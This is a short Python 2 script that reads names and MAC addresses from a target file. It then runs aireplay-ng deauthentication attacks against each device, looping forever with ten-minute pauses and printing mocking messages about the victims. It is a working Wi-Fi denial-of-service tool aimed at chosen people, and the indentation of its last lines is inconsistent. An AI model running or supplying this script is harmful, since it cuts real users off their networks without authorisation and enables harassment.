#!/usr/bin/python

import subprocess
import time

wifi_interface = raw_input("enter wireless interface: ")

file = open("graphic.txt",'r')
graphic = file.read()
file.close()
file = open("targets.txt", 'r')
targetlist = file.read().split()
file.close()

namelist = targetlist[0::3] 
maclist = targetlist[1::3]
aplist = targetlist[2::3]
number_of_targets = len(maclist)

print graphic
print 'THESE LOOK IMPORTANT :P'
print ""
for target in namelist:
    print target
print ""
print 'won''t be needing these any longer XD'

prog_name = "aireplay-ng -0 100 -a "

round = 1

while(True):
    for x in range(0,2):
        for target in range(0, number_of_targets):
            command = prog_name+aplist[target]+" -c "+maclist[target]+" "+wifi_interface
            print str(round)+": "+command
            p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            round += 1
   print "..resting for 10 minutes"
   for y in range(0,10):
       time.sleep(60)
   print "OK! back to it!"

